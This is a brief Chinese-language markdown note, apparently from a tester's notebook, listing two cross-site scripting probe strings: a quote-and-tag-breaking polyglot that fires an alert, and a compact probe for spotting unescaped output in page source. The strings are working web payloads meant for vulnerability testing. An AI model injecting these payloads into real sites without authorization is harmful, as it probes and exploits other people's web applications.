---
title: xss payload
tags: xss,payload,001
grammar_cjkRuby: true
---


XSS 探测器 01：

``` javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";

alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--

></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

```

XSS探测器 02（如果你没有充足的输入空间去检测页面是否存在xss漏洞。下面这段代码是一个好的简洁的xss注入检测代码。在注入这段代码后，查看页面源代码寻找是否存在看起来像 <XSS verses <XSS这样的输出点从而判断是否存在xss漏洞。 ）：

``` javascript
'';!--"<XSS>=&{()}
```

